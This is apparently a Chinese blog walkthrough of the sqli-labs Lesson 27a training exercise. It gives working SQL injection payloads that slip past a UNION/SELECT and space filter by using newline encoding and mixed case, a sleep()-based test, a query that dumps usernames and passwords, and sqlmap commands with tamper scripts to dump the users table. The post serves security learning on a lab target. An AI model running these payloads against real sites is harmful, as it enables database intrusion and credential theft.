---
title: sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号
date: 2018-10-06 22:19:23
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号

---

## 登录界面

![001](/img/sql/Lesson-27a/001.png)

## 注入

### 判断类型

由于没有报错信息只能通过时间函数来判断了。

`http://192.168.75.132/sql/Less-27a/?id=1%0Aand%0A1=2`

![002](/img/sql/Lesson-27a/002.png)

如果SQL语句是这样的话`	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`会把传进去的`1 and 1=2`进行判断,左右两边都成立才会显示查询到的数据。明明右边不成力,这里直接却显示出了数据,肯定不是数字型。

字符型很好判断,因为id在数据库被设置为int类型,而在php中遇到字符串转换int类型时默认会把字符串的第一个字符转为数字,这里`1 and 1=2`的第一个是`1`,那么就转换成了1。对应的如果传进去的`a and 1=2`会拿`a`转数字,然而字母转数字默认为0,如果数据库中没有id=0的数据,就不会显示了。

![003](/img/sql/Lesson-27a/003.png)

用if()函数和sleep()函数判断。

`http://192.168.75.132/sql/Less-27a/?id=1"%0Aand%0Aif(1,sleep(60),null)%0Aand%0A"1`

![004](/img/sql/Lesson-27a/004.png)

可以判断这一课是使用双引号闭合的了。

### 过程

其他的和Lesson-26只是闭合方式不同,其他一样,直接上图。

`http://192.168.75.132/sql/Less-27a/?id=1"%0Aand%0A1=2%0AuNion%0AseLect%0A1,(seLect%0Agroup_concat(id,'~',username,'~',password)%0Afrom%0Asecurity.users%0A),3%0Aand"1`

![005](/img/sql/Lesson-27a/005.png)

{% post_link sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号 点击查看Lesson-27 %}

## SQLMAP

`python sqlmap.py -u "http://192.168.75.132/sql/Less-27a/?id=1" --technique B --dbms mysql --threads 10 --method GET --tamper "UnionSelect.py,space0A.py,count.py" --flush-session --fresh-queries -v 3 --level 2`

```
--technique B:检查布尔型注入方式
--threads 10：并发线程数为10
--method GET：使用GET方法
--tamper "UnionSelect.py,space0A.py,count.py"：绕过Union,Select，空格，count(*)
--flush-session:刷新session
--fresh-queries:发起新查询
-v 3：显示测试过程
--level 2：等级2才会检查双引号
```

![006](/img/sql/Lesson-27a/006.png)

![007](/img/sql/Lesson-27a/007.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-27a/?id=1" --technique B --dbms mysql --threads 10 --method GET --tamper "UnionSelect.py,space0A.py,count.py" --dbs`

![008](/img/sql/Lesson-27a/008.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-27a/?id=1" --technique B --dbms mysql --threads 10 --method GET --tamper "UnionSelect.py,space0A.py,count.py" -D security -T users --columns --dump`

![009](/img/sql/Lesson-27a/009.png)